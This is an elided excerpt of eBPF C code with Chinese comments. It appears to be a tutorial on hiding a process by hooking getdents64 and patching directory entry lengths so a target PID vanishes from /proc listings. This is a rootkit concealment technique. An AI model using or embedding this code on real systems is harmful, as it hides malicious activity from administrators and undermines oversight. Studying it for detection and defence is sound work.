...
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    ...
    for (int i = 0; i < 200; i++)
    {
        ...
        if (j == pid_to_hide_len)
        {
            ...
            // ***********
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);// 删除 map_bytes_read 中的元素, map_bytes_read 中存储的是当前读取到的位置，说明已经读取完成
            bpf_map_delete_elem(&map_buffs, &pid_tgid);// 删除 map_buffs 中的元素, map_buffs 中存储的是 linux_dirent64 结构体的地址
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        /*getdents64 系统调用返回的不是一个简单的数组，而是一串连续存放但长度不固定 d_reclen的 linux_dirent64 结构体： */
        // 所以需要将 bpos 向后移动 d_reclen 个字节，跳到下一个 linux_dirent64 结构体的起始位置
        bpos += d_reclen;
    }

    // If we didn't find it, but there's still more to read,
    // jump back the start of this function and keep looking
    if (bpos < total_bytes_read)// 还有数据未读取
    {
...
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    ...
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);// 查找 map_to_patch 中的元素, map_to_patch 中存储的是 linux_dirent64 结构体的地址
    if (pbuff_addr == 0)
    {
        return 0;
    }
    ...
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;// 指向上一个 linux_dirent64 结构体的指针
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);// 指向当前 linux_dirent64 结构体的指针
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
